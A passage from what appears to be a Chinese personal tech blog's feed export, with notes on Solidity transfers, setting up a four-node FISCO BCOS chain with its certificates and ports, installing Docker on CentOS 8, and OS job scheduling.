<span class="keyword">this</span>;</span><br><span class="line"><span class="keyword">if</span> (x.balance &lt; <span class="number">10</span> &amp;&amp; myAddress.balance &gt;= <span class="number">10</span>) x.transfer(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h4 id="send"><a href="#send" class="headerlink" title="send"></a>send</h4><p>发送是的低级对应 transfer 。如果执行失败，则当前合同不会停止，但 send 将返回 false 。<br>使用中存在一些不安全的send：如果调用堆栈深度为1024（调用程序始终强制调用堆栈深度），则调用失败，如果收件人耗尽Gas，调用堆栈深度也将失败。所以为了安全的传输，总是检查返回值send，使用transfer甚至更好：使用接收者提取钱的模式</p><h3 id="动态大小的字节数组"><a href="#动态大小的字节数组" class="headerlink" title="动态大小的字节数组"></a>动态大小的字节数组</h3><p>bytes：动态大小的字节数组</p><p>string：动态大小的UTF-8的编码字符串</p><h1 id="搭建局域fisco的区块链网络"><a href="#搭建局域fisco的区块链网络" class="headerlink" title="搭建局域fisco的区块链网络"></a>搭建局域fisco的区块链网络</h1><p>本节以搭建单群组FISCO BCOS链为例操作。使用<code>开发部署工具 build_chain.sh</code>脚本在本地搭建一条<strong>4 节点</strong>的FISCO BCOS链，以<code>Ubuntu 16.04 64bit</code>系统为例操作。</p><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p><code>sudo apt install -y openssl curl</code></p><h2 id="下载脚本"><a href="#下载脚本" class="headerlink" title="下载脚本"></a>下载脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## 创建操作目录</span><br><span class="line">cd ~ &amp;&amp; mkdir -p fisco &amp;&amp; cd fisco</span><br><span class="line"></span><br><span class="line">## 下载脚本</span><br><span class="line">curl -#LO https://github.com/FISCO-BCOS/FISCO-BCOS/releases/download/v2.7.2/build_chain.sh &amp;&amp; chmod u+x cd .sh</span><br></pre></td></tr></table></figure><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191109694.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191109694.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331191109694" style="zoom:67%;"><h2 id="搭建单群组4节点的联盟链"><a href="#搭建单群组4节点的联盟链" class="headerlink" title="搭建单群组4节点的联盟链"></a>搭建单群组4节点的联盟链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545</span><br></pre></td></tr></table></figure><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191219219.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191219219.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331191219219" style="zoom:67%;"><h2 id="启动节点"><a href="#启动节点" class="headerlink" title="启动节点"></a>启动节点</h2><p><code>bash nodes/127.0.0.1/start_all.sh</code></p><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191339449.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191339449.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331191339449" style="zoom:67%;"><h2 id="配置和使用控制台"><a href="#配置和使用控制台" class="headerlink" title="配置和使用控制台"></a>配置和使用控制台</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y default-jdk</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/fisco &amp;&amp; curl -LO https://github.com/FISCO-BCOS/console/releases/download/v2.7.2/download_console.sh &amp;&amp; bash download_console.sh</span><br></pre></td></tr></table></figure><p>因为控制台是基于javaSDK实现，所以需要下载java的sdk，拷贝控制台控制i文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 最新版本控制台使用如下命令拷贝配置文件</span><br><span class="line">cp -n console/conf/config-example.toml console/conf/config.toml</span><br></pre></td></tr></table></figure><p>配置控制台证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r nodes/127.0.0.1/sdk/* console/conf/</span><br></pre></td></tr></table></figure><p>启动控制台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/fisco/console &amp;&amp; bash start.sh</span><br></pre></td></tr></table></figure><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191755041.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331191755041.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331191755041" style="zoom:67%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取客户端版本</span><br><span class="line"> getNodeVersion</span><br><span class="line">获得节点的信息</span><br><span class="line"> getPeers</span><br><span class="line">查看当前块高</span><br><span class="line"> getBlockNumber</span><br><span class="line">调用合约 call 合约名 地址 函数名 参数</span><br></pre></td></tr></table></figure><h2 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h2><p>部署的合约应该放在<code>contracts/solidity/HelloWorld.sol</code>其中的helloworld.sol为合约，部署成功后会返回合约的地址，</p><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331192026900.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210331192026900.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210331192026900" style="zoom:67%;"><h1 id="开发一个基础的区块链应用"><a href="#开发一个基础的区块链应用" class="headerlink" title="开发一个基础的区块链应用"></a>开发一个基础的区块链应用</h1><h2 id="了解应用需求"><a href="#了解应用需求" class="headerlink" title="了解应用需求"></a>了解应用需求</h2><ul><li>能够在区块链上进行资产注册</li><li>能够实现不同账户的转账</li><li>可以查询账户的资产金额</li></ul><h2 id="设计和开发智能合约"><a href="#设计和开发智能合约" class="headerlink" title="设计和开发智能合约"></a>设计和开发智能合约</h2><p>FISCO BCOS平台目前支持Solidity及Precompiled两类合约形式。</p><ul><li>Solidity合约与以太坊相同，用Solidity语法实现。</li><li>KVTable合约的读写接口与<strong>Table合约的CRUD接口</strong>通过在Solidity合约中支持分布式存储预编译合约，可以实现将Solidity合约中数据存储在FISCO BCOS平台AMDB的表结构中，实现合约逻辑与数据的分离。</li><li>预编译（Precompiled）合约使用C++开发，内置于FISCO BCOS平台，相比于Solidity合约具有更好的性能，其合约接口需要在编译时预先确定，适用于逻辑固定但需要共识的场景，例如群组配置。关于预编译合约的开发将在下一节进行介绍。</li></ul><h1 id="区块链节点"><a href="#区块链节点" class="headerlink" title="区块链节点"></a>区块链节点</h1><p>节点是区块链上的执行单元。多个节点彼此连接，构成一个P2P网络，承载了区块链上的通信，计算和存储。节点入网后（加入联盟），成为区块链上的一个共识单位。多个节点参与共识，确保了区块链上交易的一致。</p><h1 id="证书说明"><a href="#证书说明" class="headerlink" title="证书说明"></a>证书说明</h1><p>FISCO-BCOS网络采用面向CA的准入机制，保障信息保密性、认证性、完整性、不可抵赖性。</p><p><strong>一条链拥有一个链证书及对应的链私钥，链私钥由链管理员拥有</strong>。并对每个参与该链的机构签发机构证书，机构证书私钥由机构管理员持有，并对机构下属节点签发节点证书。节点证书是节点身份的凭证，并使用该证书与其他节点间建立SSL连接进行加密通讯。sdk证书是sdk与节点通信的凭证，机构生成sdk证书，允许sdk与节点进行通信。</p><table><thead><tr><th align="left">后缀</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">.key</td><td align="left">私钥</td></tr><tr><td align="left">.srl</td><td align="left">文件存储序列号</td></tr><tr><td align="left">.csr</td><td align="left">证书请求文件</td></tr><tr><td align="left">.crt</td><td align="left">Certificate 证书</td></tr><tr><td align="left">.pubkey</td><td align="left">公钥</td></tr><tr><td align="left">.private</td><td align="left">私钥.key编码得到</td></tr><tr><td align="left">.p12</td><td align="left">PKCS#12格式来储存密钥</td></tr><tr><td align="left">.keystore</td><td align="left">用做web3sdk的SSL证书</td></tr><tr><td align="left">.crl</td><td align="left">证书吊销列表</td></tr></tbody></table><h2 id="角色定义"><a href="#角色定义" class="headerlink" title="角色定义"></a>角色定义</h2><p>FISCO-BCOS准入机制中，不同角色拥有不同的密钥与证书文件，共同保障信息保密性、认证性、完整性、不可抵赖性。FISCO-BCOS中，共有四种角色，分别是<strong>链管理员</strong>，<strong>机构</strong>，<strong>节点</strong>和<strong>SDK</strong>。</p><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210401153259676.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210401153259676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210401153259676" style="zoom:67%;"><h3 id="链管理员1"><a href="#链管理员1" class="headerlink" title="链管理员1"></a>链管理员1</h3><p>链管理员管理链的私钥，可以向机构颁发机构证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ca.crt 链证书</span><br><span class="line">ca.key 链私钥</span><br><span class="line">ca.srl 链序列号</span><br></pre></td></tr></table></figure><h3 id="机构："><a href="#机构：" class="headerlink" title="机构："></a>机构：</h3><p>机构拥有机构私钥，可以颁发节点证书和sdk证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ca.crt 链证书</span><br><span class="line">agency.crt 机构证书</span><br><span class="line">agency.csr 机构证书请求文件</span><br><span class="line">agency.key 机构私钥</span><br><span class="line">agency.srl 机构序列号</span><br><span class="line">ca-agency.crt 机构和链的证书</span><br></pre></td></tr></table></figure><h3 id="节点："><a href="#节点：" class="headerlink" title="节点："></a>节点：</h3><p>节点管理节点私钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ca.crt 链证书</span><br><span class="line">node.ca节点证书相关信息，应用于系统合约</span><br><span class="line">node.crt 节点证书</span><br><span class="line">node.csr节点证书请求文件</span><br><span class="line">node.key节点私钥</span><br><span class="line">node.private节点私钥编码得到</span><br><span class="line">node.pubkey 节点公钥</span><br><span class="line">node.serial 节点序列号</span><br></pre></td></tr></table></figure><h3 id="SDK："><a href="#SDK：" class="headerlink" title="SDK："></a>SDK：</h3><p>sdk管理sdk私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ca.crt 链证书</span><br><span class="line">clent.keysotre 用做web3sdk的SSL证书</span><br><span class="line">keystore.p12 用pkcs#12存储的密钥</span><br><span class="line">sdk.crt sdk证书</span><br><span class="line">sdk.csr sdk证书请求文件</span><br><span class="line">sdk.key sdk私钥</span><br><span class="line">sdk.private sdk私钥编码得到</span><br><span class="line">sdk.pubkey sdk公钥</span><br></pre></td></tr></table></figure><h1 id="FISCO-BCOS-2-0的网络端口"><a href="#FISCO-BCOS-2-0的网络端口" class="headerlink" title="FISCO BCOS 2.0的网络端口"></a>FISCO BCOS 2.0的网络端口</h1><p>P2P端口、RPC端口、Channel端口</p><img src="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210401152317013.png" class="lazyload" data-srcset="/2021/03/31/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE2/image-20210401152317013.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210401152317013" style="zoom:67%;"><h2 id="P2P端口"><a href="#P2P端口" class="headerlink" title="P2P端口"></a>P2P端口</h2><p><strong>P2P端口</strong>，用于区块链节点之间的互联，包括机构内的多个节点，以及多机构间节点和节点的互联。如果其他节点在机构外，那么这个连接要监听公网地址，或者监听内网，且由连接公网的网关（如nginx）转发网络连接。</p><p>节点之间的连接会由联盟链的准入机制控制，节点之间连接依赖节点证书验证，以排除未经许可的危险连接。这个链路上的数据通过SSL方式加密，采用高强度密钥，可以有效的保护通信安全</p><h2 id="Channel端口"><a href="#Channel端口" class="headerlink" title="Channel端口"></a>Channel端口</h2><p>Channel端口，控制台和客户端SDK连接Channel端口，互相之间要通过证书认证，只有经过认证的客户端才能向节点发起请求，通信数据也是采用SSL方式加密。Channel端口使用了TCP的长连接，用心跳包检测和保持存活，通信效率较高，支持AMOP协议的点对点通信，功能相当灵活强大。</p><p>Channel端口应只监听内网IP地址，供机构内其他的应用服务器通过SDK连接，不应监听外网地址或接受公网的连接，以免发生不必要的安全的问题，也不要只监听本地地址（127.0.0.1或localhost），否则其他应用服务器将无法连接到节点上。</p><h3 id="RPC端口"><a href="#RPC端口" class="headerlink" title="RPC端口"></a>RPC端口</h3><p>RPC是客户端与区块链系统交互的一套协议和接口，用户通过RPC接口可查询区块链相关信息（如块高、区块、节点连接等）和发送交易。</p><p>RPC端口接受JSON-RPC格式的请求，格式比较直观清晰，采用CURL、JavaScript、Python、Go等语言都可以组装JSON格式的请求，发送到节点来处理。<strong>当然发送交易时，要在客户端实现交易签名</strong>。要注意的是，RPC连接没有做证书验证，且网络传输默认是明文的，安全性相对不高，建议只监听内网端口，用于监控、运营管理，状态查询等内部的工作流程上。目前监控脚本，区块链浏览器连接的是RPC端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[rpc]</span><br><span class="line">listen_ip=127.0.0.1 //只有同在本机上的其他进程才能连接到这个地址</span><br><span class="line">channel_listen_port=20200</span><br><span class="line">jsonrpc_listen_port=8545</span><br><span class="line">[p2p]</span><br><span class="line">listen_ip=0.0.0.0 //表示监听所有地址，包括本地、内网、公网地址，也就是全面开放</span><br><span class="line">listen_port=30300 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学-代理重加密</title>
      <link href="/2021/03/27/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%BB%A3%E7%90%86%E9%87%8D%E5%8A%A0%E5%AF%86/"/>
      <url>/2021/03/27/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E4%BB%A3%E7%90%86%E9%87%8D%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h1>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链</title>
      <link href="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
      <url>/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="centos8Docker安装"><a href="#centos8Docker安装" class="headerlink" title="centos8Docker安装"></a>centos8Docker安装</h1><h2 id="更新yum"><a href="#更新yum" class="headerlink" title="更新yum"></a>更新yum</h2><p>安装docker ce即社区免费版，先安装必要的软件包，安装yum-utils，它提供一个yum-config-manager单元，同时安装的device-mapper-persistent-data和lvm2用于储存设备映射（devicemapper）必须的两个软件包。</p><p><code>sudo yum update  </code></p><p><code>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</code></p><img src="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330164037502.png" class="lazyload" data-srcset="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330164037502.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210330164037502" style="zoom:33%;"><p>配置一个docker的yum的仓库，使用的是阿里云的</p><p><code>sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></p><p>更新关于yum的软件包</p><p><code>sudo yum makecache fast</code></p><img src="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330164448925.png" class="lazyload" data-srcset="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330164448925.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210330164448925" style="zoom:50%;"><p><strong>出现了意外错误 即centos8没有该参数，解决办法为：去掉fast参数</strong></p><h2 id="查看仓库版本，并安装指定版本"><a href="#查看仓库版本，并安装指定版本" class="headerlink" title="查看仓库版本，并安装指定版本"></a>查看仓库版本，并安装指定版本</h2><p><code>yum list docker-ce --showduplicates | sort -r</code></p><p><code>yum install docker-ce-3:20.10.5-3.el8.x86_64</code></p><img src="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330164627299.png" class="lazyload" data-srcset="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330164627299.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210330164627299" style="zoom:67%;"><p>然后出现了错误的信息，根据提示需要package docker-ce-3:20.10.5-3.el8.x86_64 requires containerd.io &gt;= 1.4.1,也就是那个包版本要高一点 wget 下载 <a href="https://download.docker.com/linux/centos/7/x86_64/edge/Packages/">https://download.docker.com/linux/centos/7/x86_64/edge/Packages/</a> 下的containerd包 ，<code>yum -y install xxx</code>升级该包</p><p>最后<code>yum install docker-ce-3:20.10.5-3.el8.x86_64</code></p><p>查看是否安装成功</p><img src="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330165202529.png" class="lazyload" data-srcset="/2021/03/22/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/image-20210330165202529.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210330165202529" style="zoom:67%;"><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#下载docker-compose</span><br><span class="line">curl -L &quot;https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">#给docker-compose赋权限</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">#检查是否安装好，正常的话会显示出版本号</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h2 id="Docker组成"><a href="#Docker组成" class="headerlink" title="Docker组成"></a>Docker组成</h2><ul><li>Docker Client 客户端</li><li>Docker Daemon 守护进程</li><li>Docker Image 镜像</li><li>Docker Container 容器</li></ul><h2 id="Docker启动以及常用命令"><a href="#Docker启动以及常用命令" class="headerlink" title="Docker启动以及常用命令"></a>Docker启动以及常用命令</h2><p>启动命令：</p><p><code>service docker start</code></p><p>开机自启动：</p><p><code>chkconfig docker on</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.处理机调度</title>
      <link href="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/"/>
      <url>/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="1-处理机调度的层次和调度算法的目标"><a href="#1-处理机调度的层次和调度算法的目标" class="headerlink" title="1.处理机调度的层次和调度算法的目标"></a>1.处理机调度的层次和调度算法的目标</h1><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6-1616388054541.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6-1616388054541.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="处理机调度"></p><h1 id="2-批处理系统中的作业"><a href="#2-批处理系统中的作业" class="headerlink" title="2.批处理系统中的作业"></a>2.批处理系统中的作业</h1><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E6%89%B9%E5%A4%84%E7%90%86%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BD%9C%E4%B8%9A-1616397642330.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E6%89%B9%E5%A4%84%E7%90%86%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E4%BD%9C%E4%B8%9A-1616397642330.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="批处理系统中的作业"></p><h2 id="1-作业和作业步"><a href="#1-作业和作业步" class="headerlink" title="1.作业和作业步"></a>1.作业和作业步</h2><h5 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h5><p>​        在批处理系统中，是以作业为基本单位从外存调入内存中</p><h5 id="作业步"><a href="#作业步" class="headerlink" title="作业步"></a>作业步</h5><p>​        每个作业必须经过若干个相对独立，又相互关联的顺序加工步骤才能得到结果，每个加工步骤称为一个作业步</p><h2 id="2-作业控制块JCB"><a href="#2-作业控制块JCB" class="headerlink" title="2.作业控制块JCB"></a>2.作业控制块JCB</h2><h5 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h5><p>​        作业标识、用户名称、作业类型、作业状态、调度信息、资源需求、资源使用情况</p><h5 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h5><ul><li>​        作业进入系统，由作业注册程序为该作业建立一个作业控制JCB，根据作业类型，放到相应的作业后备队列中等待调度。</li><li>​        作业运行期间，系统按照JCB中的信息和作业说明书对作业进行控制</li><li>​        当一个作业执行结束进入完成状态时，系统负责回收已经分配资源，撤销该作业控制块</li></ul><h2 id="3-作业运行三个阶段和三种状态"><a href="#3-作业运行三个阶段和三种状态" class="headerlink" title="3.作业运行三个阶段和三种状态"></a>3.作业运行三个阶段和三种状态</h2><p>​    收容阶段-后备状态</p><p>​    运行阶段-运行阶段</p><p>​    完成阶段-完成阶段</p><h1 